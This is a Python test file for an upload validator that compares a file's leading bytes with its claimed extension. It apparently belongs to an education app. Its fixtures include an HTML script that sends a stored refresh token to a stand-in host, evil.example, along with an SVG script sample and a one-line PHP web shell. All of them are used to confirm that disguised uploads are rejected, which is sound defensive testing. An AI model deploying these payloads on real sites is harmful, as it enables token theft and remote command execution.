"""Magic-byte checks on uploads.

Every one of these would have passed before the fix: the extension allow-list
in `app.core.storage` reads the *name* the uploader chose, and the name is
the one part of an upload an attacker fully controls. The interesting case is
not "a .exe was rejected" -- it is a file whose name says .png and whose
bytes say HTML, which a browser will happily render on the app's own origin.
"""

import pytest

from app.core.file_type import matches_extension

# Real prefixes, not placeholders -- the point of the check is the bytes.
PNG = b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR"
JPEG = b"\xff\xd8\xff\xe0\x00\x10JFIF\x00"
WEBP = b"RIFF\x24\x00\x00\x00WEBPVP8 "
PDF = b"%PDF-1.7\n%\xe2\xe3\xcf\xd3"

HTML = b"<html><script>fetch('//evil.example/'+localStorage.getItem('edunation_refresh_token'))</script>"
SVG_WITH_SCRIPT = b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'
PHP = b"<?php system($_GET['c']); ?>"


@pytest.mark.parametrize(
    "payload,extension",
    [
        (PNG, ".png"),
        (JPEG, ".jpg"),
        (JPEG, ".jpeg"),
        (WEBP, ".webp"),
        (PDF, ".pdf"),
    ],
)
def test_genuine_files_are_accepted(payload, extension):
    assert matches_extension(payload, extension) is True


@pytest.mark.parametrize(
    "payload,extension",
    [
        # The three renames the audit brief calls out by name.
        (HTML, ".png"),
        (SVG_WITH_SCRIPT, ".png"),
        (PHP, ".pdf"),
        # ...and the same trick against every other accepted extension.
        (HTML, ".jpg"),
        (HTML, ".webp"),
        (HTML, ".pdf"),
        (SVG_WITH_SCRIPT, ".webp"),
        # A real image under the wrong image extension: still a mismatch,
        # because the served Content-Type is derived from the extension.
        (PNG, ".jpg"),
        (JPEG, ".png"),
        (PDF, ".png"),
    ],
)
def test_renamed_payloads_are_rejected(payload, extension):
    assert matches_extension(payload, extension) is False


def test_leading_whitespace_does_not_hide_markup():
    """`<html>` behind a few spaces or newlines is still `<html>` to a
    browser sniffing the response, so it must not slip past the prefix check."""
    assert matches_extension(b"\n\n   " + HTML, ".png") is False


def test_riff_alone_is_not_a_webp():
    """A .wav is also RIFF. Without the WEBP tag at offset 8 the container
    check would accept any RIFF file under an image extension."""
    assert matches_extension(b"RIFF\x24\x00\x00\x00WAVEfmt ", ".webp") is False


def test_office_documents_must_match_their_container():
    """A .docx is a zip and a .doc is an OLE2 file. When the bytes name one
    of those containers, the extension has to agree -- a zip called .doc is
    not a document the app should be storing under that name."""
    assert matches_extension(b"PK\x03\x04\x14\x00", ".docx") is True
    assert matches_extension(b"PK\x03\x04\x14\x00", ".doc") is False
    assert matches_extension(b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1", ".doc") is True
    assert matches_extension(b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1", ".docx") is False


def test_plain_text_homework_is_still_accepted():
    """A .txt has no signature; rejecting it would break a legitimate
    homework submission. It is safe because it is only ever served back as an
    attachment with nosniff -- see storage.attachment_response."""
    assert matches_extension("Решение задачи №3".encode(), ".txt") is True


def test_markup_in_a_txt_is_rejected_anyway():
    """Belt and braces: a .txt whose first bytes are HTML has no legitimate
    use here, and the allow-list would otherwise wave it through."""
    assert matches_extension(HTML, ".txt") is False


def test_unknown_extension_is_never_accepted():
    assert matches_extension(b"MZ\x90\x00", ".exe") is False
    assert matches_extension(PNG, ".svg") is False
